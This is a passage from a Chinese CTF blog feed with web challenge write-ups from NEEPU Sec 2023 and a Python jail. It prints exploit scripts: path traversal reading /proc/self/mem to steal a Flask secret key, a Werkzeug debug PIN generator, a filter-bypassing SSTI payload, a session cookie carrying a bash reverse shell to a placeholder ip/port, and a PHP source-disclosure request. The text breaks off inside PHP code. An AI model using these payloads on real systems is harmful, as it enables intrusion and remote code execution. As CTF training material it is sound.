src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685376171342-f5a06679-c278-4cbd-b93b-a6849e78235b.png" alt="img"></p><h2 id="pyshell"><a href="#pyshell" class="headerlink" title="pyshell"></a>pyshell</h2><p>一道python jail 过滤了很多字符 并且限制了输入字符不能超过7位 其实就是构造shell的奇淫姿势</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval(open(&quot;/flag&quot;, &quot;r&quot;).read())</span></span><br><span class="line"><span class="string">&quot;open&quot;</span></span><br><span class="line">_+<span class="string">&quot;(&quot;</span></span><br><span class="line">_+<span class="string">&#x27;&quot;/&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;f&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;l&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;a&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;g&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;,&quot;&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;r&quot;&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;.r&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;e&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;a&#x27;</span></span><br><span class="line">_+<span class="string">&#x27;d&#x27;</span></span><br><span class="line">_+<span class="string">&quot;(&quot;</span></span><br><span class="line">_+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="keyword">eval</span>(_)</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685421976872-e11473ca-c080-4534-865d-4105b49099fd.png" alt="img"></p><p>这里用到的<code>&#39;_&#39;</code>是一种特殊标识符， 在交互式解释器中被用来存放最近一次求值结果  。参考：<a href="https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=%E7%A7%81%E6%9C%89">https://www.bookstack.cn/read/python3.9-reference-zh/spilt.2.spilt.3.ef7aded97a6c46a9.md?wd=%E7%A7%81%E6%9C%89</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1685422038294-70bb1976-24c9-4e7d-95f2-b5e59c7c0437.png" alt="img"></p><h1 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h1><p>最近期末了，可能会忙期末的事情，先把六级过了md，这次一定要过了，已经是第二次了，上次就差十来分，可恶啊，不想被这个拖着了，还有期末冲了，什么数电，信号，电路给👴死，等着奥，头套给你薅一地 必须打你脸奥，当然比赛不会停，秉着菜还爱打的良好作风，冲了，只是WP会欠一些，比如BUU还欠着一些，亏贼，干了！</p>]]></content>
      
      
      <categories>
          
          <category> 各赛事WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE奇淫方式 </tag>
            
            <tag> 软链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NEEPU Sec 2023 公开赛 WEB部分题复现</title>
      <link href="/post/c9fcd25b.html"/>
      <url>/post/c9fcd25b.html</url>
      
        <content type="html"><![CDATA[<p>NEEPU Sec 2023 公开赛 WEB部分题复现</p><p>我就是个纯废物</p><span id="more"></span><h1 id="Cute-Cirno"><a href="#Cute-Cirno" class="headerlink" title="Cute Cirno"></a>Cute Cirno</h1><p>人最麻的一集 本来应该很快出结果的 还是自己太菜了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846488175-ee0bc923-7cc9-410d-bc70-809ca3c8a30f.png" alt="img"></p><p>存在一个任意文件读取的漏洞 通过报错信息 去读app文件</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846571811-25873264-780e-4dff-9d59-cd927722f6fc.png" alt="img"></p><p>或者访问<code>/proc/self/cmdline</code>去获取当前正在运行的进程</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684846615322-ce39f4fa-5632-4dfc-8f50-b543633b1ba7.png" alt="img"></p><p>获得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os, base64</span><br><span class="line"><span class="keyword">from</span> NeepuFile <span class="keyword">import</span> neepu_files</span><br><span class="line"></span><br><span class="line">CuteCirno = Flask(__name__,static_url_path=<span class="string">&#x27;/static&#x27;</span>,static_folder=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line">CuteCirno.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(base64.b64encode(os.urandom(<span class="number">30</span>)).decode()) + <span class="string">&quot;*NeepuCTF*&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;welcome.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/Cirno&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;CleverCirno.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/r3aDF1le&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_read</span>():</span><br><span class="line">    filename = <span class="string">&quot;static/text/&quot;</span> + request.args.get(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;comment.txt&#x27;</span>)</span><br><span class="line">    start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> neepu_files(filename, start, end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@CuteCirno.route(<span class="params"><span class="string">&#x27;/genius&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&#x27;admin&#x27;</span>))</span><br><span class="line">        answer = request.args.get(<span class="string">&#x27;answer&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> answer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            blacklist = [<span class="string">&#x27;_&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;namespace&#x27;</span>,<span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;self&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;00&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">                         <span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;&#123;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#125;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;=&#x27;</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> answer:</span><br><span class="line">                    answer = <span class="string">&quot;⑨&quot;</span> +<span class="string">&quot;&quot;&quot;&lt;/br&gt;&lt;img src=&quot;static/woshibaka.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Cirno&quot;&gt;&quot;&quot;&quot;</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> answer == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;你能告诉聪明的⑨, 1+1的answer吗&quot;</span></span><br><span class="line">            <span class="keyword">return</span> render_template_string(<span class="string">&quot;1+1=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(answer))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;mathclass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;你真的是我的马斯塔吗？&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    CuteCirno.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>其实一眼扫过去就是session伪造 然后套了一层ssti</p><p>但是当时做这道题的时候看了他的key生成过程 就觉得key根本伪造不了</p><h2 id="非预期："><a href="#非预期：" class="headerlink" title="非预期："></a>非预期：</h2><p>然后既然之前都报错了 说明debug是开启的 源码中也表明了</p><p>呢就直接去计算pin码</p><p>网上脚本很多 主要有高版本和低版本的 这里要根据题目去选择相应的脚本版本</p><p>这道题目是高版本的</p><p>脚本如下：参考 <a href="https://pysnow.cn/archives/170/">https://pysnow.cn/archives/170/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377568585&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address 十进制</span></span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2&#x27;</span></span><br><span class="line">    <span class="comment"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                            <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>当时做题没算出pin码 不知道是哪里出的问题 甚至把所有id都试了一次</p><p>之后复现的时候 才发现被脚本中的提示稍稍误导了一下 或者是自己纯菜</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># 字符串合并：1./etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id，有boot-id那就拼接boot-id 2. /proc/self/cgroup</span><br></pre></td></tr></table></figure><p>脚本中提到<code>/etc/machine-id(docker不用看) </code> 难道赛题环境不是docker吗 我裂开</p><p>但是这道题目需要合并<code>/etc/machine-id</code> <code>/proc/self/cgroup</code>才能计算出正确的pin码</p><p>当时做题的时候一直用<code>/proc/sys/kernel/random/boot_id</code>  <code> /proc/self/cgroup</code>去算 一直是错的</p><p>不过这里也不是说脚本中提到的是错的 而是做题的时候最好都试一遍 qwq</p><p>应该是先去读<code>/etc/machine-id</code>，如果读不到,那么就是<code>/proc/sys/kernel/random/boot_id</code>和<code>/proc/self/cgroup</code>拼接了  </p><p>计算出来之后 命令执行即可</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847479030-dc13e6dc-8671-4aca-800c-ff56cc7245e3.png" alt="img"></p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>赛后了解了一下 发现预期解太难了 是根据2022年蓝帽杯初赛改编的</p><p>然后这里key的确是伪造不出来 但是任何信息都是存在内存里 可以通过去读内存读出来 借用p神的语句<a href="https://erroratao.github.io/2022/07/10/File_Session/#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3">https://erroratao.github.io/2022/07/10/File_Session&#x2F;#%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B-file-session-%E8%A7%81%E8%A7%A3</a></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684847734991-7cd63f83-6f22-46aa-83d3-406c8efd6f6e.png" alt="img"></p><p>这里直接贴上Boogipop 亮sensei的脚本 看得出来也是从p神稍加修改 而我连脚本都看不懂 尼玛就菜的离谱 暑假一定要去系统学一下python 好好锻炼锻炼自己写脚本的能力</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># print(str(base64.b64encode(os.urandom(30)).decode()) + &quot;*NeepuCTF*&quot;)</span></span><br><span class="line"><span class="comment"># pollution_url=&quot;http://localhost:8848/?name=os.path.pardir&amp;m1sery=boogipop&quot;</span></span><br><span class="line"><span class="comment"># flagurl=&quot;http://localhost:8848/../../flag&quot;</span></span><br><span class="line">url=<span class="string">&quot;http://neepusec.fun:28954//r3aDF1le&quot;</span></span><br><span class="line">maps_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/maps&quot;</span></span><br><span class="line">maps_reg = <span class="string">&quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span></span><br><span class="line">maps = re.findall(maps_reg, requests.get(maps_url).text)</span><br><span class="line"><span class="built_in">print</span>(maps)</span><br><span class="line">cookie=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> maps:</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    start, end = m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">0</span>], m.split(<span class="string">&quot;-&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    Offset, Length = <span class="built_in">str</span>(<span class="built_in">int</span>(start, <span class="number">16</span>)), <span class="built_in">str</span>(<span class="built_in">int</span>(end, <span class="number">16</span>))</span><br><span class="line">    read_url = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?filename=../../../proc/self/mem&amp;start=<span class="subst">&#123;Offset&#125;</span>&amp;end=<span class="subst">&#123;Length&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(read_url)</span><br><span class="line">    s = requests.get(read_url).content</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    rt = re.findall(<span class="string">b&quot;(.&#123;40&#125;)\*NeepuCTF\*&quot;</span>, s)</span><br><span class="line">    <span class="keyword">if</span> rt:</span><br><span class="line">        <span class="built_in">print</span>(rt[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>脚本大致过程就是 先去读取&#x2F;proc&#x2F;self&#x2F;maps的信息 </p><p>然后通过map里栈的地址  再去去正则匹配里面的信息 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">maps_reg = &quot;([a-z0-9]&#123;12&#125;-[a-z0-9]&#123;12&#125;) rw.*?00000000 00:00 0&quot;</span><br></pre></td></tr></table></figure><p>就是去匹配这样的信息<code>7f50caee6000-7f50cb9e6000 rw-p 00000000 00:00 0</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684848131309-905d4a14-43af-403a-9294-792623cc66e4.png" alt="img"></p><p>然后再根据读出来的地址mem内存   然后再去通过地址范围正则匹配我们需要的key 就行了</p><p>真的tql</p><p>session伪造成功后 就是一个过滤了 很多字符的ssti</p><p>根据亮sensei的payload session 伪造的时候 通过把shell放进session 然后我们payload去截取就可以了 真的tql</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.pyencode-s&quot;key&quot;-t&quot;&#123;&#x27;admin&#x27;:1,&#x27;__globals__&#x27;:1,&#x27;os&#x27;:1,&#x27;read&#x27;:1,&#x27;popen&#x27;:1,&#x27;bash-c\&#x27;bash-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1\&#x27;&#x27;:1&#125;&quot;</span><br></pre></td></tr></table></figure><p>payload：<code>&#123;%print(((lipsum[(session|string)[35:46]])[(session|string)[53:55]])[(session|string)[73:78]]((session|string)[85:139]))%&#125;</code></p><p>然后这里需要注意 截的时候并不是我们直接看到的<code>&#123;&#39;admin&#39;:1,&#39;__globals__&#39;:1,&#39;os&#39;:1,&#39;read&#39;:1,&#39;popen&#39;:1,&#39;bash-c\&#39;bash-i&gt;&amp;/dev/tcp/ip/port&lt;&amp;1\&#39;&#39;:1&#125;</code>索引</p><p>通过<code>&#123;%print(session|string)%&#125;</code>可以打印出来 前面还有点其他信息 这是一个小细节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SecureCookieSession &#123;&#x27;admin&#x27;: 1, &#x27;__globals__&#x27;: 1, &#x27;os&#x27;: 1, &#x27;read&#x27;: 1, &#x27;popen&#x27;: 1, &quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1&#x27;&quot;: 1&#125;&gt;</span><br></pre></td></tr></table></figure><p>通过反弹shell 就ok了 真的太强了</p><p>发现还是得去老老实实去刷一遍ctfshow的ssti 去弄明白不同的paylaod</p><h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>当时做这道题 一看界面是空白的 各种尝试之后还是啥都没有 就放弃了</p><p>看了wp 返现是php&lt;&#x3D;7.4.21远程源码泄露的漏洞  <a href="https://cn-sec.com/archives/1530845.html">https://cn-sec.com/archives/1530845.html</a></p><p>其实关键是怎么发现php版本???? 并且检索到相关漏洞</p><p>可能大佬一眼就丁真了 对我比较困难</p><p>然后抓包 构造一个如下的请求头</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: neepusec.fun:<span class="number">28426</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /HTTP/<span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>获得源码</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1684852650636-c4706a7d-d4b2-4246-922e-4109cacd8b54.png" alt="img"></p><p>是一个pop链</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span>  <span class="title">one</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span>||<span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish)&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>],<span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">neepuctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;now=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="variable language_">$this</span>-&gt;key=True;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">two</span></span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span>=<span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">three</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  